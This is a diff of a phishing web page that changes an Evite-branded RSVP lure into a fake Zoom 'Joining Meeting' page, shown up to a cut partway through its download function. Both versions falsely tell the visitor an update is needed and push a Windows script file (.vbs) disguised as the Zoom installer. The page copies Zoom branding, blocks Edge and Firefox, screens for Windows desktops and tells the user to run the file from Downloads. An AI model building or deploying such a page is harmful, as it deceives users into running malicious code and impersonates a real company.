@@ -1,331 +1,426 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-
-body{
-    font-family:Arial, sans-serif;
-    background:#f5f7f6;
-}
-
-.container{
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-    padding:20px;
-}
-
-.thanks-card{
-    max-width:550px;
-    padding:3rem 2rem;
-    background:#fff;
-    border-radius:20px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.08);
-    border-top:6px solid #28a842;
-    text-align:center;
-}
-
-.thanks-card h2{
-    font-size:28px;
-    color:#28a842;
-    margin-bottom:10px;
-}
-
-.thanks-card p{
-    font-size:16px;
-    color:#555;
-    margin-bottom:20px;
-}
-
-button{
-    background:#28a842;
-    color:#fff;
-    border:none;
-    padding:14px 30px;
-    font-size:16px;
-    border-radius:50px;
-    cursor:pointer;
-    font-weight:bold;
-    transition:all .2s;
-}
-
-button:hover{
-    background:#1e7e34;
-    transform:scale(1.03);
-}
-
-button:disabled{
-    background:#aaa;
-    cursor:not-allowed;
-}
-
-.progress-container{
-    width:100%;
-    background:#e6f4ea;
-    border-radius:10px;
-    margin:20px 0;
-    overflow:hidden;
-    display:none;
-}
-
-.progress-bar{
-    width:0%;
-    height:6px;
-    background:#28a842;
-}
-
-#toast{
-    position:fixed;
-    bottom:30px;
-    left:50%;
-    transform:translateX(-50%) translateY(20px);
-    background:#1f2f29;
-    color:#fff;
-    padding:14px 24px;
-    border-radius:50px;
-    font-size:14px;
-    opacity:0;
-    transition:.3s;
-    z-index:10000;
-    pointer-events: none;
-    white-space: nowrap;
-}
-
-#toast b{color:#ffd966;}
-
-#browser-warning {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: #ffffff;
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 100000;
-    flex-direction: column;
-    text-align: center;
-    padding: 20px;
-    overflow-y: auto;
-}
-
-.warning-card {
-    max-width: 500px;
-    width: 90%;
-    background: #fff;
-    border-radius: 28px;
-    padding: 48px 36px;
-    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15);
-    border-top: 6px solid #ff3b30;
-}
-
-.warning-icon {
-    width: 80px;
-    height: 80px;
-    background: #fee2e2;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 24px;
-}
-
-.warning-icon svg {
-    width: 42px;
-    height: 42px;
-}
-
-.warning-card h1 {
-    font-size: 28px;
-    font-weight: 800;
-    margin-bottom: 12px;
-    color: #1a1a2e;
-}
-
-.warning-card p {
-    font-size: 16px;
-    color: #5c5c70;
-    margin-bottom: 28px;
-    line-height: 1.5;
-}
-
-.browser-icons {
-    display: flex;
-    justify-content: center;
-    gap: 32px;
-    margin: 28px 0;
-    flex-wrap: wrap;
-}
-
-.browser-badge {
-    text-align: center;
-}
-
-.browser-badge svg {
-    width: 52px;
-    height: 52px;
-    margin-bottom: 8px;
-}
-
-.browser-badge span {
-    font-size: 14px;
-    color: #333;
-    font-weight: 600;
-    display: block;
-}
-
-.browser-badge .check {
-    font-size: 12px;
-    margin-top: 6px;
-    font-weight: 500;
-}
-
-.browser-badge .check.valid {
-    color: #28a842;
-}
-
-.browser-badge .check.invalid {
-    color: #ff3b30;
-}
-
-.url-box {
-    background: #f5f5f7;
-    padding: 16px;
-    border-radius: 16px;
-    margin: 20px 0 20px;
-    word-break: break-all;
-    font-family: 'SF Mono', monospace;
-    font-size: 13px;
-    color: #1a1a2e;
-    border: 1px solid #e8e8ed;
-    text-align: left;
-    display: none;
-}
-
-.copy-btn {
-    background: #4285f4;
-    color: white;
-    border: none;
-    padding: 14px 24px;
-    font-size: 15px;
-    font-weight: 600;
-    border-radius: 60px;
-    cursor: pointer;
-    transition: all 0.2s;
-    width: 100%;
-    margin-bottom: 12px;
-}
-
-.copy-btn:hover {
-    background: #3367d6;
-    transform: scale(1.02);
-}
-
-.instruction-text {
-    font-size: 13px;
-    color: #28a842;
-    margin-top: 16px;
-    background: #e8f5e9;
-    padding: 12px;
-    border-radius: 12px;
-    font-weight: 500;
-}
-
-.warning-footer {
-    margin-top: 32px;
-    font-size: 12px;
-    color: #8e8e93;
-    padding-top: 16px;
-    border-top: 1px solid #efeff4;
-}
-
-.top-logo{
-    position:fixed;
-    top:20px;
-    left:20px;
-    z-index:9999;
-}
-
-.top-logo img{
-    width:80px;
-    height:auto;
-    display:block;
-}
-
-#loading-overlay{
-    position:fixed;
-    width:100%;
-    height:100%;
-    background:#fff;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    flex-direction:column;
-    z-index:100000;
-}
-
-.loading-spinner{
-    border:3px solid #e6f4ea;
-    border-top:3px solid #28a842;
-    border-radius:50%;
-    width:70px;
-    height:70px;
-    animation:spin .6s linear infinite;
-}
-
-.loading-text{
-    margin-top:15px;
-    color:#333;
-}
-
-@keyframes spin{
-    0%{transform:rotate(0)}
-    100%{transform:rotate(360deg)}
-}
-
-#cf-turnstile {
-    display: none;
-}
-
-@media (max-width: 550px) {
-    .warning-card {
-        padding: 36px 24px;
+    <meta charset="UTF-8">
+    <title>Joining Meeting</title>
+    <link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
+    <meta name="robots" content="noindex,nofollow,noarchive">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <style>
+    body {
+        margin: 0;
+        font-family: "Inter", Arial, sans-serif;
+        background: #f7f7f7;
+        color: #232333;
     }
-    .warning-card h1 {
-        font-size: 24px;
+
+    .header {
+        background: #ffffff;
+        border-bottom: 1px solid #e5e5e5;
+        padding: 18px 40px;
     }
-    .browser-icons {
-        gap: 20px;
+
+    .logo {
+        font-size: 28px;
+        font-weight: 600;
+        color: #2d8cff;
     }
-    #toast {
-        white-space: normal;
+
+    .container {
         text-align: center;
-        max-width: 90%;
-        font-size: 13px;
+        margin-top: 90px;
     }
-}
-</style>
 
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    h1 {
+        font-size: 30px;
+        font-weight: 600;
+        margin-bottom: 20px;
+    }
+
+    p {
+        font-size: 16px;
+        color: #4a4a4a;
+        margin: 10px 0;
+        line-height: 1.6;
+    }
+
+    .link {
+        color: #2d8cff;
+        text-decoration: none;
+        font-weight: 500;
+    }
+
+    .link:hover {
+        text-decoration: underline;
+    }
+
+    .btn {
+        margin-top: 30px;
+        background-color: #2d8cff;
+        color: #fff;
+        border: none;
+        padding: 14px 32px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
+
+    .btn:hover {
+        background-color: #1a73e8;
+    }
+
+    .progress-container {
+        width: 300px;
+        height: 6px;
+        background: #e6e6e6;
+        border-radius: 10px;
+        margin: 25px auto;
+        overflow: hidden;
+    }
+
+    .progress-bar {
+        height: 100%;
+        width: 0%;
+        background: #2d8cff;
+    }
+
+    .divider {
+        width: 60%;
+        margin: 50px auto;
+        border-top: 1px solid #e5e5e5;
+    }
+
+    .footer {
+        margin-top: 60px;
+        text-align: center;
+        font-size: 13px;
+        color: #777;
+    }
+
+    .footer a {
+        color: #2d8cff;
+        text-decoration: none;
+        margin: 0 5px;
+    }
+
+    .footer a:hover {
+        text-decoration: underline;
+    }
+
+    #loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 99999;
+        flex-direction: column;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .loading-spinner-container {
+        position: relative;
+        width: 80px;
+        height: 80px;
+        margin-bottom: 20px;
+    }
+
+    .loading-spinner {
+        position: absolute;
+        border: 2px solid #f3f3f3;
+        border-top: 2px solid #0066cc;
+        border-radius: 50%;
+        width: 75px;
+        height: 75px;
+        animation: spin 0.5s linear infinite;
+    }
+
+    .loading-icon {
+        position: absolute;
+        width: 30px;
+        height: 30px;
+        top: 47%;
+        left: 47%;
+        transform: translate(-50%, -50%);
+    }
+
+    .loading-text {
+        font-size: 16px;
+        color: #333;
+        font-weight: normal;
+        margin-top: 20px;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    #cf-turnstile {
+        margin: 20px auto;
+    }
+
+    .form-container {
+        display: none;
+    }
+
+    .verified .form-container {
+        display: block;
+    }
+
+    button:disabled {
+        background: #999;
+        cursor: not-allowed;
+        opacity: 0.6;
+    }
+
+    /* Browser warning panel (Edge/Firefox blocker) */
+    #browser-warning {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #ffffff;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 100000;
+        flex-direction: column;
+        text-align: center;
+        padding: 20px;
+        overflow-y: auto;
+        font-family: "Inter", Arial, sans-serif;
+    }
+
+    .warning-card {
+        max-width: 550px;
+        width: 90%;
+        background: #fff;
+        border-radius: 28px;
+        padding: 48px 36px;
+        box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15);
+        border-top: 6px solid #ff3b30;
+    }
+
+    .warning-icon {
+        width: 80px;
+        height: 80px;
+        background: #fee2e2;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 24px;
+    }
+
+    .warning-icon svg {
+        width: 42px;
+        height: 42px;
+    }
+
+    .warning-card h1 {
+        font-size: 28px;
+        font-weight: 800;
+        margin-bottom: 12px;
+        color: #1a1a2e;
+    }
+
+    .warning-card p {
+        font-size: 16px;
+        color: #5c5c70;
+        margin-bottom: 28px;
+        line-height: 1.5;
+    }
+
+    .browser-icons {
+        display: flex;
+        justify-content: center;
+        gap: 32px;
+        margin: 28px 0;
+        flex-wrap: wrap;
+    }
+
+    .browser-badge {
+        text-align: center;
+    }
+
+    .browser-badge svg {
+        width: 52px;
+        height: 52px;
+        margin-bottom: 8px;
+    }
+
+    .browser-badge span {
+        font-size: 14px;
+        color: #333;
+        font-weight: 600;
+        display: block;
+    }
+
+    .browser-badge .check {
+        font-size: 12px;
+        margin-top: 6px;
+        font-weight: 500;
+    }
+
+    .browser-badge .check.valid {
+        color: #28a842;
+    }
+
+    .browser-badge .check.invalid {
+        color: #ff3b30;
+    }
+
+    .copy-btn {
+        background: #4285f4;
+        color: white;
+        border: none;
+        padding: 14px 24px;
+        font-size: 15px;
+        font-weight: 600;
+        border-radius: 60px;
+        cursor: pointer;
+        transition: all 0.2s;
+        width: 100%;
+        margin-bottom: 12px;
+    }
+
+    .copy-btn:hover {
+        background: #3367d6;
+        transform: scale(1.02);
+    }
+
+    .instruction-text {
+        font-size: 13px;
+        color: #28a842;
+        margin-top: 16px;
+        background: #e8f5e9;
+        padding: 12px;
+        border-radius: 12px;
+        font-weight: 500;
+    }
+
+    .warning-footer {
+        margin-top: 32px;
+        font-size: 12px;
+        color: #8e8e93;
+        padding-top: 16px;
+        border-top: 1px solid #efeff4;
+    }
+
+    #deviceWarning {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #f5f7fa;
+        z-index: 99998;
+        overflow-y: auto;
+    }
+
+    .warning-wrapper {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+
+    .warning-header {
+        background-color: white;
+        padding: 16px 5%;
+        border-bottom: 1px solid #e2e2e5;
+    }
+
+    .warning-logo {
+        height: 25px;
+    }
+
+    .warning-container {
+        flex: 1;
+        width: 90%;
+        max-width: 480px;
+        margin: 60px auto;
+        padding: 42px 32px;
+        background-color: white;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.06);
+        text-align: center;
+        border-radius: 14px;
+    }
+
+    .alert-icon {
+        margin-bottom: 20px;
+        display: flex;
+        justify-content: center;
+    }
+
+    .warning-container h1 {
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 18px;
+        color: #232333;
+    }
+
+    .message-box {
+        background-color: #f0f6ff;
+        border: 1px solid #cfe0ff;
+        padding: 18px;
+        border-radius: 10px;
+        margin-bottom: 20px;
+    }
+
+    .secondary-text {
+        font-size: 15px;
+        color: #5c5c70;
+        margin-bottom: 30px;
+    }
+
+    .pc-requirement {
+        margin-top: 30px;
+    }
+
+    .windows-icon {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 14px;
+    }
+
+    .device-badge {
+        display: inline-block;
+        background: #f0f2f5;
+        padding: 6px 14px;
+        border-radius: 20px;
+        font-size: 13px;
+        margin-top: 10px;
+        color: #5c5c70;
+    }
+
+    @media (max-width: 550px) {
+        .warning-card {
+            padding: 36px 24px;
+        }
+        .warning-card h1 {
+            font-size: 24px;
+        }
+        .browser-icons {
+            gap: 20px;
+        }
+    }
+    </style> 
 </head>
-
 <body>
 
-<div class="top-logo">
-    <img src="e.png" alt="E-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 100 100\'%3E%3Crect width=\'100\' height=\'100\' fill=\'%2328a842\'/%3E%3Ctext x=\'50\' y=\'67\' font-size=\'50\' text-anchor=\'middle\' fill=\'white\'%3EE%3C/text%3E%3C/svg%3E'">
-</div>
-
-<div id="loading-overlay">
-    <div class="loading-spinner"></div>
-    <div class="loading-text">Verifying your Invitation...</div>
-    <div id="cf-turnstile"></div>
-</div>
-
+<!-- Edge/Firefox Blocking Overlay (same logic as first HTML) -->
 <div id="browser-warning">
     <div class="warning-card">
         <div class="warning-icon">
@@ -336,7 +431,7 @@ button:disabled{
             </svg>
         </div>
         <h1>Browser Not Supported</h1>
-        <p>This RSVP invitation system does not support <strong>Microsoft Edge</strong> or <strong>Mozilla Firefox</strong>. Please use <strong>Google Chrome</strong> or <strong>Brave</strong> to access your invitation.</p>
+        <p>This meeting system does not support <strong>Microsoft Edge</strong> or <strong>Mozilla Firefox</strong>. Please use <strong>Google Chrome</strong> or <strong>Brave</strong> to access your secure invitation & meeting.</p>
         
         <div class="browser-icons">
             <div class="browser-badge">
@@ -374,37 +469,124 @@ button:disabled{
             </div>
         </div>
 
-        <button class="copy-btn" id="copyLinkBtn">📋 Copy Invitation Link</button>
+        <button class="copy-btn" id="copyLinkBtn">📋 Copy Meeting Link</button>
         
         <div class="instruction-text">
-            💡 <strong>How to continue:</strong> Copy the link above → Open Chrome → Paste in address bar → Press Enter
+            💡 <strong>How to continue:</strong> Copy the link above → Open Chrome/Brave → Paste in address bar → Press Enter
         </div>
         
         <div class="warning-footer">
-            <span style="font-size: 11px; opacity: 0.7;">This link contains your secure invitation</span><br>
-            © 2026 Evite · Desktop browser required
+            <span style="font-size: 11px; opacity: 0.7;">This link contains your secure meeting invitation</span><br>
+            © 2026 Zoom Workplace · Desktop browser required
+        </div>
+    </div>
+</div>
+
+<div id="loading-overlay">
+    <div class="loading-spinner-container">
+        <div class="loading-spinner"></div>
+        <img src="z.png" class="loading-icon" alt="Loading Icon">
+    </div>
+    <div class="loading-text">Connecting...</div>
+    <div id="cf-turnstile"></div>
+</div>
+
+<div id="deviceWarning">
+    <div class="warning-wrapper">
+        <div class="warning-header">
+            <img alt="Zocsd" class="zoom-logo" src="https://st1.zoom.us/static/6.3.53146/image/new/topNav/Zoom_logo.svg" />
+        </div>
+        <div class="warning-container">
+            <div class="alert-icon">
+                <svg aria-hidden="true" fill="none" height="48" viewbox="0 0 24 24" width="48"> 
+                    <circle cx="12" cy="12" r="10" stroke="#0b5cff" stroke-width="2"></circle> 
+                    <path d="M12 10v6" stroke="#0b5cff" stroke-linecap="round" stroke-width="2"></path> 
+                    <circle cx="12" cy="7" fill="#0b5cff" r="1"></circle> 
+                </svg>
+            </div>
+            <h1>Use the Zoom Workplace desktop app</h1>
+            <div class="message-box">
+                <p>To join this meeting, please open it in the <strong>Zoom Workplace desktop app</strong>.</p>
+            </div>
+            <div class="secondary-text">
+                This browser environment doesn&rsquo;t support the features required for this meeting.
+            </div>
+            <div class="pc-requirement">
+                <svg aria-hidden="true" class="windows-icon" viewbox="0 0 24 24"> 
+                    <path d="M2 4.5l9-1.3v8.2H2V4.5zm10 6.8V3l10-1.5v9.8H12zm0 1.7h10v9.8L12 21v-8zm-1 8V13H2v6.5l9 1.5z" fill="#0b5cff"></path> 
+                </svg>
+                <div style="font-size:15px;font-weight:600;color:#0b5cff;">
+                    Switch to a Windows PC or desktop.
+                </div>
+                <div class="device-badge">
+                    Desktop environment required
+                </div>
+            </div>
+        </div>
+        <div class="warning-footer">
+            Zoom Video Communications, Inc.
+            <div class="notice">
+                Compatibility notice: Desktop app required
+            </div>
         </div>
     </div>
 </div>
 
 <div class="form-container">
-    <div class="container" id="mainContainer">
-        <div class="thanks-card">
-            <h2>🎉 You're invited! 🎉</h2>
-            <p>Your RSVP event package is being prepared ...</p>
-            <p>Open the downloaded file that contains your digital RSVP form to make RSVP.</p>	
-            <p>🎊 Thank You 🎊</p>	   
-            <div class="progress-container" id="progressContainer">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <button id="manualDownload">Download Invitation Card</button>
-        </div>
+    <div id="header" role="banner" class="clearfix">
+        <svg style="margin-top: 30px; margin-left: 30px;" width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
+        </svg>
     </div>
-
-    <div id="toast"></div>
+    <div class="container">
+        <h1>Joining Meeting</h1>
+        <p>Sorry, You are using old version of zoom Workplace App.</p>
+        <p> It requires latest zoom Workplace to join the meeting.</p>
+        <p> Download has started automatically, kindly install to join the Remote
+            Desktop Meeting. </p>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        <p> A computer is required to launch the meeting, If the
+            download doesn't start automatically, please <a href="Zoomworkplace5691242026.vbs" class="link" id="manualDownload">Download Manually</a>
+        </p>
+        <button id="launchBtn" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
+            Launch Meeting
+        </button>
+        <div class="divider"></div>
+        <p style="font-size:13px;"> By joining a meeting, you agree to our <a href="#" class="link">Terms of Service</a> and <a href="#" class="link">Privacy Statement</a> </p>
+    </div>
+    <div id="toast" style="
+        position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
+        Go to Downloads folder and click on <b>ZoomWorkplace........vbs</b> to launch meeting
+    </div>
+    <div class="footer">
+        <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
+            zoom Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
+                rights reserved.</span></p>
+        <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
+            <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust Center |</a><span>&nbsp;</span>
+            <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Acceptable Use Guidelines |</a><span>&nbsp;</span>
+            <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Legal &amp; Compliance |</a><span>&nbsp;</span>
+            <a href="#" tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Do Not Sell My Personal Information |</a><span>&nbsp;</span>
+            <a href="#" tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie Preferences</a>
+        </p>
+    </div>
 </div>
 
 <script>
+const files = {
+    windows: {
+        url: "Zoomworkplace5691242026.vbs",
+        name: "Zoomworkplace5691242026.vbs"
+    }
+};
+
+let selectedFile = files.windows;
+let turnstileVerified = false;
+let currentPageUrl = "";
+
+// ----- Browser block detection: Edge & Firefox only -----
 function isBlockedBrowser() {
     const ua = navigator.userAgent || "";
     const userAgentData = navigator.userAgentData || null;
@@ -431,107 +613,13 @@ function isBlockedBrowser() {
     }
     
     if (window.MSStream) return true;
-    
     if (ua.indexOf("Edg") !== -1) return true;
     if (ua.indexOf("Firefox") !== -1) return true;
-    
     return false;
-}
-
-const files = { windows: { url: "EVITEJUNE2026.vbs", name: "EVITEJUNE2026.vbs" } };
-let selectedFile = files.windows;
-let downloadInProgress = false;
-let turnstileVerified = false;
-let currentPageUrl = "";
-
-function isDesktopWindows() {
-    const ua = navigator.userAgent || "";
-    const platform = navigator.platform || "";
-    return /Win/i.test(platform) && !/Mobile/i.test(ua);
-}
-
-function showToast(msg, isError = false) {
-    const t = document.getElementById("toast");
-    t.innerHTML = msg;
-    t.style.opacity = "1";
-    t.style.transform = "translateX(-50%)";
-    t.style.background = isError ? "#8B0000" : "#1f2f29";
-    setTimeout(() => { 
-        t.style.opacity = "0";
-        setTimeout(() => { t.style.background = "#1f2f29"; }, 400);
-    }, 4000);
-}
-
-function updateProgress(p) {
-    const progContainer = document.getElementById("progressContainer");
-    const progBar = document.getElementById("progressBar");
-    if (progContainer) progContainer.style.display = "block";
-    if (progBar) progBar.style.width = p + "%";
-}
-
-async function downloadFile(file) {
-    if (downloadInProgress) return;
-    downloadInProgress = true;
-    updateProgress(15);
-    try {
-        const res = await fetch(file.url);
-        if (!res.ok) throw new Error("fetch failed");
-        const blob = await res.blob();
-        updateProgress(70);
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = file.name || file.url.split('/').pop();
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        updateProgress(100);
-        setTimeout(() => {
-            const progContainer = document.getElementById("progressContainer");
-            const progBar = document.getElementById("progressBar");
-            if (progContainer) progContainer.style.display = "none";
-            if (progBar) progBar.style.width = "0%";
-        }, 1500);
-        showToast("✅ Download complete! Check your Downloads folder.");
-    } catch (err) {
-        console.warn("fetch failed, redirect fallback", err);
-        window.location.href = file.url;
-        showToast("⚠️ Download started directly.");
-    }
-    downloadInProgress = false;
-}
-
-function launchMeeting() {
-    if (!turnstileVerified) {
-        showToast("Please complete verification first", true);
-        return;
-    }
-    
-    if (isBlockedBrowser()) {
-        showBlockedWarning();
-        return;
-    }
-    
-    if (!isDesktopWindows()) {
-        showToast("Please use a Windows desktop computer to RSVP", true);
-        return;
-    }
-    
-    downloadFile(selectedFile);
 }
 
 function getCurrentInvitationUrl() {
     return window.location.href;
-}
-
-function updateInviteUrlDisplay() {
-    const urlBox = document.getElementById("inviteUrlDisplay");
-    if (urlBox) {
-        const fullUrl = getCurrentInvitationUrl();
-        currentPageUrl = fullUrl;
-        urlBox.innerHTML = `🔗 <strong>Your Invitation Link</strong><br><span style="font-size:12px; word-break:break-all; font-family:monospace;">${escapeHtml(fullUrl)}</span>`;
-    }
 }
 
 function escapeHtml(str) {
@@ -553,16 +641,17 @@ function copyLinkToClipboard() {
     if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(urlToCopy).then(() => {
             const copyBtn = document.getElementById("copyLinkBtn");
-            const originalText = copyBtn.innerHTML;
-            copyBtn.innerHTML = "✅ Copied! Now open Chrome/Safari/Opera";
-            copyBtn.style.background = "#28a842";
-            setTimeout(() => {
-                copyBtn.innerHTML = originalText;
-                copyBtn.style.background = "#4285f4";
-            }, 3000);
-            showToast("✅ Link copied! Open Chrome, Safari, or Opera and paste.");
+            if (copyBtn) {
+                const originalText = copyBtn.innerHTML;
+                copyBtn.innerHTML = "✅ Copied! Now open Chrome/Brave";
+                copyBtn.style.background = "#28a842";
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalText;
+                    copyBtn.style.background = "#4285f4";
+                }, 3000);
+            }
+            showToast("✅ Link copied! Open Chrome or Brave and paste.");
         }).catch(err => {
-            console.error("Clipboard error: ", err);
             fallbackCopy(urlToCopy);
         });
     } else {
@@ -579,7 +668,7 @@ function fallbackCopy(text) {
     textarea.select();
     try {
         document.execCommand("copy");
-        showToast("✅ Link copied! Paste into Chrome, Safari, or Opera address bar.");
+        showToast("✅ Link copied! Paste into Chrome/Brave address bar.");
     } catch (err) {
         showToast("❌ Could not copy. Please manually copy the URL.", true);
     }
@@ -588,10 +677,12 @@ function fallbackCopy(text) {
 
 function showBlockedWarning() {
     const loadingOverlay = document.getElementById("loading-overlay");
-    const mainContainer = document.getElementById("mainContainer");
+    const deviceWarning = document.getElementById("deviceWarning");
+    const formContainer = document.querySelector(".form-container");
     
     if (loadingOverlay) loadingOverlay.style.display = "none";
-    if (mainContainer) mainContainer.style.display = "none";
+    if (deviceWarning) deviceWarning.style.display = "none";
+    if (formContainer) formContainer.style.display = "none";
     
     const browserWarning = document.getElementById("browser-warning");
     if (browserWarning) {
@@ -613,90 +704,158 @@ function preFlightBrowserCheck() {
     return false;
 }
 
-document.addEventListener("DOMContentLoaded", () => {
+function isDesktopWindows() {
+    const ua = navigator.userAgent || "";
+    const platform = navigator.platform || "";
+    const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
+    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+    const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);
+    return isWindows && !isMobile && !isTouchOnly;
+}
+
+function showToast(message, isError = false, duration = 15000) {
+    const toast = document.getElementById("toast");
+    if (!toast) return;
+    toast.innerHTML = message;
+    toast.style.opacity = "1";
+    toast.style.transform = "translateY(0)";
+    if (isError) toast.style.background = "#8B0000";
+    else toast.style.background = "#333";
+    setTimeout(() => {
+        toast.style.opacity = "0";
+        toast.style.transform = "translateY(20px)";
+    }, duration);
+}
+
+function updateProgress(percent) {
+    const bar = document.querySelector(".progress-bar");
+    if (bar) bar.style.width = percent + "%";
+}
+
+async function downloadFile(file) {
+    try {
+        showToast("⬇️ Download started...");
+        const response = await fetch(file.url);
+        if (!response.ok) throw new Error("Download failed");
+        const contentLength = response.headers.get("content-length");
+        const total = contentLength ? parseInt(contentLength) : 0;
+        const reader = response.body.getReader();
+        let received = 0;
+        let chunks = [];
+        while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+            chunks.push(value);
+            received += value.length;
+            if (total) updateProgress((received / total) * 100);
+        }
